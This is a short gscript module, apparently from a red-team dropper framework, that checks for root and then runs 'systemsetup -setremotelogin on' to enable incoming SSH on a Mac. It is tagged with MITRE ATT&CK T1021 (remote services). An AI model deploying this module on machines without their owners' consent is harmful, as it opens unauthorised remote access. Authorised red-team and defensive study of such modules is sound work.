// enable remote ssh
// Title: enable remote ssh
// Author: jayhill
// Purpose:To quickly turn on SSH server and allow incoming ssh connections to the current Mac.
// Gscript version: 0.1.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1021

//priority:150
//timeout:150

function BeforeDeploy() {
  LogInfo("Enabling remoteSSH connection");
    var well = GetUser();
  LogInfo("Our user is: "+well.username);
  if (well.username == "root") {
    return true;
  } else {
    LogInfo("Detected a non-root user, this needs to run as root!");
    Halt();
    return false;
  }
  return true; 
}

function Deploy() {  
  ForkExecuteCommand("systemsetup", ["-setremotelogin", "on"]);
  return true;
}

function AfterDeploy() {
  LogInfo("Enabling remoteSSH connection");
  return true;
}
